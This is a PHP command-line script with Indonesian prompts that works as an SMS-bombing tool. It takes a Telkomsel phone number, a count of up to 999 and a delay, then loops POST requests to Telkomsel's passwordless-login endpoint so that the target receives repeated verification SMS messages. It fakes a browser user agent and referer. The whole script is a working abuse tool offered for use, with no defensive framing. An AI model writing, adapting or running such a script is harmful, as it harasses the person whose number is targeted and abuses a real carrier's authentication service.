<?php

function dsspam($no, $jum, $wait){

$x = 0; 

while($x < $jum) {

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL,"https://tdwidm.telkomsel.com/passwordless/start");


curl_setopt($ch, CURLOPT_POST, 1);

curl_setopt($ch, CURLOPT_POSTFIELDS,"phone_number=%2B".$no."&connection=sms");

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

curl_setopt($ch, CURLOPT_REFERER, 'https://my.telkomsel.com/');

curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');

$server_output = curl_exec ($ch);


curl_close ($ch);


echo $server_output."\n";

sleep($wait);


$x++;

flush();


}


}


echo "Input : ";

echo "Nomor Hp Telkomsel? (Contoh: 6281xxxx)\nInput : ";

$nomor = trim(fgets(STDIN));


echo "Jumlah? (1-999)\nInput : ";


$jumlah = trim(fgets(STDIN));


echo "Jeda? 0-999 (Contoh:1)\nInput : ";

$jeda = trim(fgets(STDIN));

$execute = dsspam($nomor, $jumlah, $jeda);


print $execute;

print ""

?>